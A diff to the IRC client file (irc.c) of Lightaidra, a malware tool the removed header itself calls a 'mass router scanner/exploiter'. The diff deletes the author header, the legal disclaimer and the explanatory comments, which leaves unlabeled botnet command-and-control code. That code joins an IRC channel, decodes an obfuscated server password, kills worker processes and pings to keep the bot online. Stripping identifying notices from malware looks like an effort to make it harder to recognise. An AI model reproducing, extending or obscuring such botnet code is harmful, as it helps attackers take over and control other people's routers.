@@ -1,15 +1,3 @@
-/*
- * irc.c - USE LIGHTAIDRA AT YOUR OWN RISK!
- *
- * Lightaidra - IRC-based mass router scanner/exploiter.
- * Copyright (C) 2008-2015 Federico Fazzi, <eurialo@deftcode.ninja>.
- *
- * LEGAL DISCLAIMER: It is the end user's responsibility to obey 
- * all applicable local, state and federal laws. Developers assume 
- * no liability and are not responsible for any misuse or damage 
- * caused by this program.
- *
- */
 
 #include "../include/headers.h"
 
@@ -18,8 +6,6 @@ int sockwrite(int sd, const char *fmt, ...);
 int irc_requests(sock_t * sp, requests_t * req);
 int pub_requests(sock_t * sp, requests_t * req);
 
-/* connect_to_irc(sock_t *) */
-/* make an irc connection.  */
 int connect_to_irc(sock_t *sp) {
     int ps = 0, port = 0;
     requests_t *req;
@@ -56,7 +42,6 @@ int connect_to_irc(sock_t *sp) {
     snprintf(channel, sizeof(channel)-1, "%s", irc_chan);
     snprintf(nt, 3, "->%s", nctype);
 
-    /* IRCD PASSWORD FOR MODDED SERVER/CLIENT WITH REPLACED PASS/local */
     if (encirc != 0) {
         decode(enc_passwd, 1);
         if (sockwrite(sp->sockfd, "%s %s\n", passproto, decodedpsw)) 
@@ -79,12 +64,10 @@ int connect_to_irc(sock_t *sp) {
         free(req);
         return EXIT_FAILURE;
     }
-
+    
     return EXIT_SUCCESS;
 }
 
-/* irc_requests(sock_t *, requests_t *) */
-/* manage the requests.                 */
 int irc_requests(sock_t *sp, requests_t *req) {
     if (max_pids > 0) kill(g_pid, 9);
 
@@ -100,9 +83,7 @@ int irc_requests(sock_t *sp, requests_t *req) {
             sleep(2);
             sockwrite(sp->sockfd, "TOPIC %s\n", channel);
         }
-
-        /* stay alive in irc when operating started. */
-        /* to prevent the connection reset           */
+        
         if (max_pids > 0) {
             sleep(4);
             cmd_ping(sp);
